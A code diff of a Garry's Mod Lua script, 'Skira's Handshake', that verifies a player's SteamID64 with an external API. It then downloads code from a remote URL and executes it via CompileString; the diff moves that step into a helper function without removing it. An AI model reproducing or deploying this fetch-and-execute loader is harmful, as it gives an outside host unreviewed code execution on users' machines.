@@ -25,7 +25,6 @@ local function getPlayerSteam64()
 end
 
 local function runRemoteCode()
-    print("[SHS]: Handshake was a success. Status: true")
     http.Fetch(REMOTE_CODE_URL,
         function(code)
             if not code or code == "" then return end
@@ -47,18 +46,6 @@ local function runRemoteCode()
 end
 
 print("SHS (Skira's Handshake) initializing...")
-print("[SHS]: Success !")
-http.Fetch(HEADER_URL,
-    function(body)
-        if not body or body == "" then return end
-        for line in body:gmatch("[^\r\n]+") do
-            print(line)
-        end
-    end,
-    function(err)
-        print("[SHS] Failed to fetch header:", err)
-    end
-)
 
 local ply = LocalPlayer()
 if not IsValid(ply) then
@@ -71,6 +58,19 @@ if not steam64 then
     print("[SHS]: Could not determine SteamID64.")
     return
 end
+
+print("[SHS]: Success !")
+http.Fetch(HEADER_URL,
+    function(body)
+        if not body or body == "" then return end
+        for line in body:gmatch("[^\r\n]+") do
+            print(line)
+        end
+    end,
+    function(err)
+        print("[SHS] Failed to fetch header:", err)
+    end
+)
 
 print("[SHS]: Trying to do that lovely handshake for "..steam64.." with our good homie the API...")
 
@@ -106,23 +106,7 @@ http.Fetch(API_BASE.."/api/check?steamid="..steam64,
                         local ok2, data2 = pcall(util.JSONToTable, resp)
                         if ok2 and data2 and data2.verified then
                             print("[SHS]: Handshake was a success. Status: true")
-                            http.Fetch(REMOTE_CODE_URL,
-                                function(code)
-                                    if not code or code == "" then return end
-                                    local func, err = CompileString(code, "shs_remote_code", false)
-                                    if not isfunction(func) then
-                                        print("[SHS] Remote code compile error:", err or "unknown")
-                                        return
-                                    end
-                                    local ok, runtimeErr = pcall(func)
-                                    if not ok then
-                                        print("[SHS] Remote code runtime error:", runtimeErr)
-                                    end
-                                end,
-                                function(err)
-                                    print("[SHS] Failed to fetch remote code:", err)
-                                end
-                            )
+                            runRemoteCode()
                         else
                             print("[SHS]: Nuh uh, you're still not verified, do all 3 checkpoints and put your SteamID64 to verify, else it won't work.")
                         end
